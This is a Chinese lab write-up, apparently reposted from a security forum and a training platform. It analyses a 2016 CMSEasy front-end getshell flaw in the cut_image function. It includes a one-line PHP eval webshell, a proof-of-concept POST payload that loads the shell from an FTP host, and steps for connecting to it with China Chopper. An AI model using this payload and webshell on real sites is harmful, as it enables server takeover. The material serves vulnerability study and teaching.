---
layout: post
title: CMSeasy前台getshell
description: CMSeasy前台getshell
category: blog
---
# 简要描述
转载自：https://xianzhi.aliyun.com/forum/read/215.html

i春秋实验：https://www.ichunqiu.com/vm/57631/1

CMSEasy官方在2016-10-12发布了一个补丁,描述只有两句话

```
前台getshell漏洞修正；
命令执行修复。
```
我们就根据补丁来分析一下这个前台Getshell漏洞

漏洞详情

在补丁页面http://www.cmseasy.cn/patch/show_1116.html下载补丁CmsEasy_for_Uploads_20161012.zip

修改的文件不多 通过diff发现补丁中lib/default/tool_act.php 392行的cut_image_action()函数被注释了

来看看这个函数
```
/*function cut_image_action() {
    $len = 1;
    if(config::get('base_url') != '/'){
        $len = strlen(config::get('base_url'))+1;
    }
    if(substr($_POST['pic'],0,4) == 'http'){
        front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);
    }else{
        front::$post['thumb'] = substr($_POST['pic'],$len);
    }
    $thumb=new thumb();
    $thumb->set(front::$post['thumb'],'jpg');
    $img=$thumb->create_image($thumb->im,$_POST['w'],$_POST['h'],0,0,$_POST['x1'],$_POST['y1'],$_POST['x2'] -$_POST['x1'],$_POST['y2'$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));
    $save_file='upload/images/'.date('Ym').'/'.$new_name;
    @mkdir(dirname(ROOT.'/'.$save_file));
    ob_start();
    $thumb->out_image($img,null,85);
    file_put_contents(ROOT.'/'.$save_file,ob_get_contents());
    ob_end_clean();
    $image_url=config::get('base_url').'/'.$save_file;
    //$res['size']=ceil(strlen($img) / 1024);
    $res['code']="
                    //$('#cut_preview').attr('src','$image_url');
                    $('#thumb').val('$image_url');
                    alert(lang('save_success'));
    ";
    echo json::encode($res);
*/
```
看保存文件名的生成:
```
$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));
```
直接用了 $_POST['pic'] 的后缀做为新文件的扩展名，应该就是这里导致的getshell

不过这里利用需要一点技巧
```
1、图片会经过php的图像库处理，如何在处理后仍然保留shell语句

2、远程加载图片需要通过file_exists函数的验证(要知道http(s)对于file_exists来说会固定返回false)
```
拆招：

在正常图片中插入shell并无视图像库的处理 这个freebuf有介绍 国外也有不少分析，当然直接拿freebuf的方法应该是不成功的 需要一点小小的调整

关于file_exits()函数 ftp://协议就可以绕过 wrappers中有介绍
```
Attribute	PHP4	PHP5
Supports stat()	No	As of PHP 5.0.0: filesize(), filetype(), file_exists(), is_file(), and is_dir() elements only.
As of PHP 5.1.0: filemtime().
5.0.0以上 就支持file_exists()了
```
这里构造payload还有一点需要注意的
```
$len = 1;
if(config::get('base_url') != '/'){
    $len = strlen(config::get('base_url'))+1;
if(substr($_POST['pic'],0,4) == 'http'){
    front::$post['thumb'] =
    str_ireplace(config::get('site_url'),'',$_POST['pic']);
}else{
    front::$post['thumb'] = substr($_POST['pic'],$len);
```
如果$_POST['pic']开头4个字符不是http的话，就认为是本站的文件，会从前面抽取掉baseurl（等于返回文件相对路径）

所以构造的时候 如果站点不是放在根目录 则需要在前面补位strlen(base_url)+2 如果放在根目录 也需要补上1位（'/'的长度）


实验工具

FTPserver.exe:一个小型的Ftp server软件。 下载地址：
```
http://file.ichunqiu.com/bfgh4eru
```

实验内容

请将工具下载到本地，将构造好的图片(包装了一句话木马)复制c:\ftp目录下。
我们打开图片内容，可以看到标识处，含有一句话代码<?php eval($_POST['c']) ;?>菜刀连接密码为c。
下面将该图片文件名修改为phpinfo.php，下面我们利用该图片木马进行漏洞利用。

请打开实验工具下载的FTP Server工具，请将该实验工具访问目录修改为c:\ftp，点击启动服务即可。

首先使用火狐浏览器打开目标界面http://www.test.ichunqiu 按F9调出hackbar工具，如下图所示：
![hackbar](https://static2.ichunqiu.com/icq/resources/fileupload/57631/4.png "hackbar")

我们构造漏洞利用代码，访问URL为http://www.test.ichunqiu/index.php?case=tool&act=cut_image

点击Enable Post data打开POST窗口，注入以下POC内容， pic=1ftp://172.16.11.2/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120 点击Execute提交，即可返回上传文件地址。
![hackbar](https://static2.ichunqiu.com/icq/resources/fileupload/57631/5.png "hackbar")


我们将上图返回的地址，复制到地址栏，(请将\/路径替换为/)访问。可以看到该文件访问成功，
![hackbar](https://static2.ichunqiu.com/icq/resources/fileupload/57631/6.png "hackbar")

下面我们尝试使用中国菜刀连接该一句话木马。复制该地址。
![hackbar](https://static2.ichunqiu.com/icq/resources/fileupload/57631/7.png "hackbar")

我们点击桌面TOOLS图片，webshell目录->中国菜刀目录-> 双击打开chopper.exe文件。 在程序窗口内，右键将地址粘贴，地址后面密码填写为c 脚本类型选择为PHP，点击添加即可。

点击添加后可以看到该目录，增加一条记录，我们双击该条目，即可进入webshell目录管理界面，该漏洞利用成功。
![hackbar](https://static2.ichunqiu.com/icq/resources/fileupload/57631/8.png "hackbar")

实验结果分析与总结

本次试验我们介绍并了解了此漏洞形成的原理，掌握了漏洞的利用方法，请同学们多加练习

修复方案

将 CmsEasy更新为最新版本
